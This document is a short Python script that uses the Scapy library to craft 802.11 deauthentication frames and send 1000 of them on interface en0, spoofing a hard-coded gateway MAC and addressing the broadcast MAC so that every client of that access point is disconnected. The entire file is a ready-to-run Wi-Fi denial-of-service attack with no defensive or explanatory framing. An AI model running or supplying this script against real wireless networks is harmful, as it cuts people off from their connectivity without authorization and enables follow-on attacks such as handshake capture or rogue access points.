from scapy.all import *

def deauth(target_mac, gateway_mac, interface, count):
    print("crafting packets")

    packet = RadioTap() / \
         Dot11(type=0,         # Management type
               subtype=12,     # Deauthentication subtype
               addr1=target_mac,
               addr2=gateway_mac,
               addr3=gateway_mac) / \
         Dot11Deauth(reason=7) # "Class 3 frame received from nonassociated STA."
    
    print("sending packets")
    sendp(packet, inter=0.1, count=count, iface=interface, verbose=1)


if __name__ == "__main__":
    deauth("FF:FF:FF:FF:FF:FF", "90:9a:4a:52:1c:18", "en0", 1000)